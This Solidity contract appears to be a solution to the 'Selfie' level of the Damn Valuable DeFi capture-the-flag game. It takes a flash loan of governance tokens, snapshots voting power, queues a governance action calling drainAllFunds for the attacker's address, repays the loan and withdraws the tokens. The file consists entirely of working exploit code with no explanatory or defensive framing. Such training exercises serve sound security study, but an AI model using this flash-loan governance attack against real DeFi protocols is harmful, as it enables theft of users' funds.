// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract SelfiePoolExploiter {
    address owner;
    DamnValuableTokenSnapshot DVT;
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;

    receive() external payable {}

    constructor(address dvt, address selfiePoolAddress, address simpleGovernanceAddress) {
        owner = msg.sender;
        DVT = DamnValuableTokenSnapshot(dvt);
        selfiePool = SelfiePool(selfiePoolAddress);
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
    }

    function exploit(uint256 amount) external {
        selfiePool.flashLoan(amount);
    }

    function withdraw() external {
        DVT.transfer(owner, DVT.balanceOf(address(this)));
    }

    function receiveTokens(address token, uint256 amount) external payable {
        DVT.snapshot();
        simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            ),
            0
        );
        DVT.transfer(address(selfiePool), amount);
    }
}